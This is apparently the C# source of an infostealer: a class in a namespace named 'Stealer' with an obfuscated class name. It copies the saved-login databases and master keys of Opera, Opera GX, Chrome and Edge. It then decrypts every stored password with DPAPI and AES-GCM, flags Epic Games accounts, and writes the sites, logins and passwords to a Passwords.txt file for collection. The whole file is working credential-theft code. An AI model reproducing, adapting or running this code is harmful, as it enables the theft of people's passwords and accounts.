using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Stealer;

internal class HPCDmXNsRephme
{
	public static int count = 0;

	public static bool epicgames = false;

	public static List<Thread> threads = new List<Thread>();

	public static void start()
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		Thread thread = new Thread((ThreadStart)delegate
		{
			getOpera();
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			getChrome();
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			getEdge();
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		threads.Add(thread);
		threads.Add(thread2);
		threads.Add(thread3);
		foreach (Thread thread4 in threads)
		{
			thread4.Join();
		}
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		cDFkBrvXKxXwYB.elapsedPasswords = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
	}

	public static void getOperaGX()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Login Data") && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"))
			{
				return;
			}
			string result = "";
			string text = "Opera Software";
			text = ((!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Login Data")) ? "Opera" : "Opera GX");
			string obj = ((text == "Opera GX") ? (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Login Data") : (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"));
			string sourceFileName = obj + "\\..\\Local State";
			string text2 = Path.GetTempPath() + "\\bdoperagx.tmp";
			string text3 = Path.GetTempPath() + "\\lsoperagx.tmp";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			File.Copy(obj, text2);
			File.Copy(sourceFileName, text3);
			SqlHandler sqlHandler = new SqlHandler(text2);
			sqlHandler.ReadTable("logins");
			string text4 = File.ReadAllText(text3);
			string[] array = Regex.Split(text4, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text4 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 5);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text5 = "";
						try
						{
							if (!value.StartsWith("v10") && !value.StartsWith("v11"))
							{
								text5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							else
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text5 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
						}
						catch (Exception)
						{
						}
						if (!(sqlHandler.GetValue(rowNum, 3) == "") || !(text5 == ""))
						{
							if (sqlHandler.GetValue(rowNum, 0).Contains("epicgames"))
							{
								epicgames = true;
							}
							result = result + "| Сайт: " + sqlHandler.GetValue(rowNum, 0) + "\n";
							result = result + "| Логин: " + sqlHandler.GetValue(rowNum, 3) + "\n";
							result = result + "| Пароль: " + text5 + "\n\n";
							count++;
						}
					}
					catch (Exception)
					{
					}
				});
				thread.Start();
				cDFkBrvXKxXwYB.threads.Add(thread);
			}
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			File.AppendAllText(Help.path_stealer + "Browsers\\Passwords.txt", result);
		}
		catch (Exception)
		{
		}
	}

	public static void getOpera()
	{
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Login Data"))
			{
				getOperaGX();
			}
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"))
			{
				return;
			}
			string result = "";
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data";
			string sourceFileName = text + "\\..\\Local State";
			string text2 = Path.GetTempPath() + "\\bdopera.tmp";
			string text3 = Path.GetTempPath() + "\\lsopera.tmp";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			File.Copy(text, text2);
			File.Copy(sourceFileName, text3);
			SqlHandler sqlHandler = new SqlHandler(text2);
			sqlHandler.ReadTable("logins");
			string text4 = File.ReadAllText(text3);
			string[] array = Regex.Split(text4, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text4 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 5);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text5 = "";
						try
						{
							if (!value.StartsWith("v10") && !value.StartsWith("v11"))
							{
								text5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							else
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text5 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
						}
						catch (Exception)
						{
						}
						if (!(sqlHandler.GetValue(rowNum, 3) == "") || !(text5 == ""))
						{
							if (sqlHandler.GetValue(rowNum, 0).Contains("epicgames"))
							{
								epicgames = true;
							}
							result = result + "| Сайт: " + sqlHandler.GetValue(rowNum, 0) + "\n";
							result = result + "| Логин: " + sqlHandler.GetValue(rowNum, 3) + "\n";
							result = result + "| Пароль: " + text5 + "\n\n";
							count++;
						}
					}
					catch (Exception)
					{
					}
				});
				thread.Start();
				cDFkBrvXKxXwYB.threads.Add(thread);
			}
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (result != "")
			{
				File.AppendAllText(Help.path_stealer + "Browsers\\Passwords.txt", result);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void getChrome86()
	{
		try
		{
			string result = "";
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google(x86)\\Chrome\\User Data\\Default\\Login Data";
			string sourceFileName = text + "\\..\\..\\Local State";
			string text2 = Path.GetTempPath() + "\\bdopera.tmp";
			string text3 = Path.GetTempPath() + "\\lsopera.tmp";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			File.Copy(text, text2);
			File.Copy(sourceFileName, text3);
			SqlHandler sqlHandler = new SqlHandler(text2);
			sqlHandler.ReadTable("logins");
			string text4 = File.ReadAllText(text3);
			string[] array = Regex.Split(text4, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text4 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 5);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text5 = "";
						try
						{
							if (!value.StartsWith("v10") && !value.StartsWith("v11"))
							{
								text5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							else
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text5 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
						}
						catch (Exception)
						{
						}
						if (!(sqlHandler.GetValue(rowNum, 3) == "") || !(text5 == ""))
						{
							if (sqlHandler.GetValue(rowNum, 0).Contains("epicgames"))
							{
								epicgames = true;
							}
							result = result + "| Сайт: " + sqlHandler.GetValue(rowNum, 0) + "\n";
							result = result + "| Логин: " + sqlHandler.GetValue(rowNum, 3) + "\n";
							result = result + "| Пароль: " + text5 + "\n\n";
							count++;
						}
					}
					catch (Exception)
					{
					}
				});
				thread.Start();
				cDFkBrvXKxXwYB.threads.Add(thread);
			}
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (result != "")
			{
				File.AppendAllText(Help.path_stealer + "Browsers\\Passwords.txt", result);
			}
		}
		catch
		{
		}
	}

	public static void getChrome()
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google(x86)\\Chrome\\User Data\\Default\\Login Data"))
				{
					getChrome86();
				}
			});
			string result;
			SqlHandler sqlHandler;
			byte[] masterKeyBytes;
			int rowNum;
			Thread thread2 = new Thread((ThreadStart)delegate
			{
				try
				{
					if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data"))
					{
						result = "";
						string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
						string sourceFileName = text + "\\..\\..\\Local State";
						string text2 = Path.GetTempPath() + "\\bdopera.tmp";
						string text3 = Path.GetTempPath() + "\\lsopera.tmp";
						if (File.Exists(text2))
						{
							File.Delete(text2);
						}
						if (File.Exists(text3))
						{
							File.Delete(text3);
						}
						File.Copy(text, text2);
						File.Copy(sourceFileName, text3);
						sqlHandler = new SqlHandler(text2);
						sqlHandler.ReadTable("logins");
						string text4 = File.ReadAllText(text3);
						string[] array = Regex.Split(text4, "\"");
						int num = 0;
						string[] array2 = array;
						for (int i = 0; i < array2.Length; i++)
						{
							if (array2[i] == "encrypted_key")
							{
								text4 = array[num + 2];
								break;
							}
							num++;
						}
						byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5));
						masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
						int rowCount = sqlHandler.GetRowCount();
						for (rowNum = 0; rowNum < rowCount; rowNum++)
						{
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									string value = sqlHandler.GetValue(rowNum, 5);
									byte[] bytes2 = Encoding.Default.GetBytes(value);
									string text5 = "";
									try
									{
										if (!value.StartsWith("v10") && !value.StartsWith("v11"))
										{
											text5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
										}
										else
										{
											byte[] iv = bytes2.Skip(3).Take(12).ToArray();
											text5 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
										}
									}
									catch (Exception)
									{
									}
									if (!(sqlHandler.GetValue(rowNum, 3) == "") || !(text5 == ""))
									{
										if (sqlHandler.GetValue(rowNum, 0).Contains("epicgames"))
										{
											epicgames = true;
										}
										result = result + "| Сайт: " + sqlHandler.GetValue(rowNum, 0) + "\n";
										result = result + "| Логин: " + sqlHandler.GetValue(rowNum, 3) + "\n";
										result = result + "| Пароль: " + text5 + "\n\n";
										count++;
									}
								}
								catch (Exception)
								{
								}
							});
							thread3.Start();
							cDFkBrvXKxXwYB.threads.Add(thread3);
						}
						if (File.Exists(text2))
						{
							File.Delete(text2);
						}
						if (File.Exists(text3))
						{
							File.Delete(text3);
						}
						if (result != "")
						{
							File.AppendAllText(Help.path_stealer + "Browsers\\Passwords.txt", result);
						}
					}
				}
				catch
				{
				}
			});
			thread.Start();
			thread2.Start();
			thread.Join();
			thread2.Join();
		}
		catch (Exception)
		{
		}
	}

	public static void getEdge()
	{
		try
		{
			string result = "";
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"))
			{
				return;
			}
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
			string sourceFileName = text + "\\..\\..\\Local State";
			string text2 = Path.GetTempPath() + "\\bdedge.tmp";
			string text3 = Path.GetTempPath() + "\\lsedge.tmp";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			File.Copy(text, text2);
			File.Copy(sourceFileName, text3);
			SqlHandler sqlHandler = new SqlHandler(text2);
			sqlHandler.ReadTable("logins");
			string text4 = File.ReadAllText(text3);
			string[] array = Regex.Split(text4, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text4 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 5);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text5 = "";
						try
						{
							if (!value.StartsWith("v10") && !value.StartsWith("v11"))
							{
								text5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							else
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text5 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
						}
						catch (Exception)
						{
						}
						if (!(sqlHandler.GetValue(rowNum, 3) == "") || !(text5 == ""))
						{
							if (sqlHandler.GetValue(rowNum, 0).Contains("epicgames"))
							{
								epicgames = true;
							}
							result = result + "| Сайт: " + sqlHandler.GetValue(rowNum, 0) + "\n";
							result = result + "| Логин: " + sqlHandler.GetValue(rowNum, 3) + "\n";
							result = result + "| Пароль: " + text5 + "\n\n";
							count++;
						}
					}
					catch (Exception)
					{
					}
				});
				thread.Start();
				cDFkBrvXKxXwYB.threads.Add(thread);
			}
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (result != "")
			{
				File.AppendAllText(Help.path_stealer + "Browsers\\Passwords.txt", result);
			}
		}
		catch (Exception)
		{
		}
	}
}
